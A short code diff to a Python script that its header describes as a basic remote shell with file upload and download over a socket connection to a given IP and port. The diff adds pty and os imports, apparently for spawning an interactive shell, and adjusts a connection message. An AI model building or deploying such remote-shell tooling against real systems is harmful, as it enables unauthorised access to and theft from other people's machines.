@@ -3,7 +3,7 @@
 # Date: 08/25/2019
 # Description: A basic python shell with upload/download functionality.
 
-import socket, time, subprocess, codecs, argparse
+import socket, time, subprocess, codecs, argparse, pty, os
 
 def upload(mysocket):
     mysocket.send(b"What is the name of the file you want to upload?:")
@@ -44,7 +44,7 @@ def connect(mySocket, ip, port):
                 print("Connectivity issues")
                 exit
             else:
-                print("Successful Connection")
+                print("Successful Connection\n")
                 connected = True
                 break
 
